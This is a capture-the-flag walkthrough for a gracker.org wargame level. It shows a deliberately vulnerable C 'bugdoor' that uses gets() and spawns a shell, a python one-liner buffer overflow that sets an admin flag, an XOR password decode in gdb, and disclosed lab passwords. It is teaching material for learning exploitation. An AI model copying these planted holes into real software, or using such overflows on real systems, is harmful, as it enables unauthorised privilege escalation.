Exercise
========

Login to ```gracker.org``` with the password of user ```level3``` which we gained in level2:
```
user@system ~ $ ssh level3@gracker.org
      __                  _
     / /                 | |
    / /_ _ _ __ __ _  ___| | _____ _ __
   / / _` | '__/ _` |/ __| |/ / _ \ '__|
  / / (_| | | | (_| | (__|   <  __/ |
 /_/ \__, |_|  \__,_|\___|_|\_\___|_|
      __/ |
     |___/
             ~ follow the white rabbit ~
                     ~ gracker ~
            ~ irc.hackint.org  #gracker ~
level3@gracker.org's password:
X11 forwarding request failed on channel 0
Congratulation! You made it to level3!
Have a look at the recap and the next story step.
The levels have been very basic and slow so far. We will introduce a few more
basic things, but then we will accelerate quickly. So make sure to research more
and play around.
 ~ Welcome to the Matrix.
```
As stated by the text which is displayed after login, we start by displaying the recap of the previous level:
```
level3@gracker:~$ cat recap
This time you probably head to look more closely at the assembly code. Luckily you have part of the sourcecode
from the story recap already. So it shouldn't have been to difficult. Here is a simple solution with `gdb` and
a short python script.

    level2@gracker:/matrix/level2$ gdb ./level2
    GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
       0x000000000040083d <+0>: push   rbp
    [... snip ...]
       0x00000000004008a2 <+101>:   movzx  eax,BYTE PTR [rbp+rax*1-0x40]
       0x00000000004008a7 <+106>:   movzx  edx,BYTE PTR [rip+0x2005d2]        # 0x600e80 <XORkey>
       0x00000000004008ae <+113>:   xor    edx,eax                            ; this time we find again a XOR key
    [... snip ...]
       0x00000000004008d8 <+155>:   mov    esi,0x600e60                       ; but if we inspect the secret_password, it will
       0x00000000004008dd <+160>:   mov    rdi,rax                            ; not be decrypted. Actually our input is XORed
       0x00000000004008e0 <+163>:   call   0x4006c0 <strcmp@plt>              ; and that is compared with the ecnrypted password
       0x00000000004008e5 <+168>:   test   eax,eax
    [... snip ...]
       0x0000000000400918 <+219>:   pop    rbp
       0x0000000000400919 <+220>:   ret
    End of assembler dump.
    (gdb) x &XORkey                                             ; so first we want to know the value of the XORkey
    0x600e80 <XORkey>:  0x00000041                              ; which is 0x41 (hex) or 65 in decimal
    (gdb) x/s 0x600e60                                          ; we also need the scrambled password.
    0x600e60 <secret_password>: ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r"
    (gdb)

If you encrypt something with XOR, you can decrypt it with the same key. So we can write a few lines of python to
decrypt the scrambled string with python:

>>> pw = ""
>>> for c in ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r":
...  pw += chr(ord(c)^0x41)
...
>>> print pw
h0w_is_th1s_h4ck3r_f0ll0wing_m3

######################################################################

Source code level2.c. The difference to level1.c is that not the clear password is compared to the input,
but the encrypted input is compared with the encrypted password.


#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>

// h0w_is_th1s_h4ck3r_f0ll0wing_m3
char secret_password[] =  "\x29\x71\x36\x1e\x28\x32\x1e\x35\x29\x70\x32\x1e\x29\x75\x22\x2a\x72\x33\x1e\x27\x71\x2d\x2d\x71\x36\x28\x2f\x26\x1e\x2c\x72";
uint8_t XORkey = 0x41;

void spawn_shell() {
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    system("/bin/sh");
}

int main (int argc, char *argv[]) {

    char password_input[32];
    char *pos;
    int i;

    printf("~Zero Cool Simple Backdoor v3~\nEnter Password:\n");
    read(STDIN_FILENO, password_input, 32);
    password_input[31]='\0';

    if ((pos=strchr(password_input, '\n')) != NULL) *pos = '\0';

    for(i=0; i<strlen(password_input); i++) {
        password_input[i] = password_input[i] ^ XORkey;
    }

    if(strcmp(password_input,secret_password)==0) {
        printf("Correct! Here is the level3 shell.\nRead the level3 password in /home/level3/.pass to login with `ssh level3@gracker.org`\n");
        spawn_shell();
    } else{
        printf("wrong!");
    }

    return 0;
}
```
After this, we can display this level's story file in order to find out what we have to do in order to get the password of level4:
```
level3@gracker:~$ cat story
┌───────────────────┐
│ BUGS EVERYWHERE!! │
└───────────────────┘
It seems like  Zero Cool  is threatened by another hacker who is following
him. So far every backdoor from him got cracked. Now he had to step up his
game.  But  apparently  he forgot  to delete  the  sourcecode  of his  new
bugdoor.
                       |     |
His  new  program is    \   /    weird. The password prompt  looks like  a
sham. But how  does he   \_/   use it to get access to level4?  It doesn't
make much sense...  __   /^\   __  This level introduces the concept  that
memory   can   be  '  `. \_/ ,'  `  accessed  outside   of  its  allocated
region, how the stack   \/ \/   variables are laid out, and that modifying
outside of the     _,--./| |\.--._     allocated memory can modify program
 ┌────────────────────────┐/-._   `._  execution.
 │  _____                 │\   |
 │ | _ _ |                │ \  |       A good place to start  is using the
 │ || | || Level3         │ |   \      man  pages  to  learn  about the  C
 │ ||_|_||   Bugdoor      │_/    `-    functions used. Maybe you can learn
 │ | _ _ o  by            │            something that can help you solving
 │ || | ||     ~Zero Cool │ this level. You should also research:
 │ ||_|_||                │         "buffer overflows"
 │ |_____|                │
 │                        │ Keep using `gdb`. Learn about single stepping,
 │ Enter Secret Password: │ setting breakpoints and understanding the
 └────────────────────────┘ stack. You will need it later more.
  Figure 1.: Zero Cool's
             bugdoor       Good Luck!
```
Solution
========

In this level we are provided with the C source code of the backdoor:

```
level3@gracker:~$cat /matrix/level3/level3.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void spawn_shell() {
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    system("/bin/sh");
}

int main(int argc, char **argv)
{
  volatile int admin_enabled;
  char buffer[64];
  admin_enabled = 0;

  printf("Zero Cool - Bugdoor v4\nEnter Password:\n");
  gets(buffer);

  if(admin_enabled != 0) {
      printf("How can this happen? The variable is set to 0 and is never modified in between O.o\nYou must be a hacker!\n");
      spawn_shell();
  } else {
      printf("Trololol lololol...\n");
  }
}
```
We can see that a shell is spawned with the privileges of level4 whenever the value of variable ```admin_enabled``` is not equal to zero. Furthermore we can see that the password is stored in a character array which has a size of 64 bytes. This is done through the ```gets``` function. ```gets``` doesn't check for buffer boundaries. Therefore it reads in as many bytes as a user types in. Whenever a user types in more than 64 bytes, the integer variable ```admin_enabled``` is overwritten. That's because it is put on the ```stack``` before the char array ```buffer```. So all we have to do in order to modify the value of the variable ```admin_enabled``` to hold a value other than a zero, is to type in 77 arbitrary characters:
```
level3@gracker:~$ (python -c 'print "A"*77';cat) | /matrix/level3/level3
Zero Cool - Bugdoor v4
Enter Password:
How can this happen? The variable is set to 0 and is never modified in between O.o
You must be a hacker!
whoami
level4
cat /home/level4/.pass
0LRS6_hjGzCf
```
